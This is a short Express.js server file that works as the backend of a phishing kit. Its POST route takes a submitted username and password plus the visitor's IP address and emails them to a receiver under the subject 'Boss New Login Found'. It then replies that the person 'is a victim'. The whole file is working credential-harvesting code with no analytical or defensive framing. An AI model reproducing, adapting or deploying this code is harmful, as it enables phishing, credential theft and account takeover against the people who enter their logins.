const express = require('express');
const cors = require("cors");
const sendEmail = require("./utils/mail");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/", async (req, res) => {
    const data = req.body;
    const email = data.receiver;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${clientIp}`;


    await sendEmail(email,"Boss New Login Found",message);
    res.send(`Success: ${data.name} - ${data.email} is a victim!`);
});

app.listen(PORT, () => {
  console.log(`Express server running at http://localhost:${PORT}/`);
});